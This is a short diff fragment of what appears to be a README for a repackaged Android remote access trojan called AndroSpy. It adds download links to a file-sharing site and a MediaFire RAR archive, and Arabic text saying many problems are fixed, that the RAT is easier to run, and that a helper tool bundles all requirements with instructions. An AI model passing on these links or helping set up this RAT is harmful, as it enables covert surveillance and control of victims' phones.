@@ -19,6 +19,11 @@ original project Link
   ** **
   https://sendvid.com/miidn7ot
 ** **
+download
+https://www.gulf-up.com/u4zn77zbwyhz
+
+https://www.mediafire.com/file/bafcqivo1dp6tgc/AndroSpy-master.rar/file
+  ** **
 تم حل العديد من المشاكل وتسهيل عمليه تشغيل الرات
 قمت بعمل اداه بسيطه جدا تحتويه على جميع المتطلبات + الشرح
 ** **
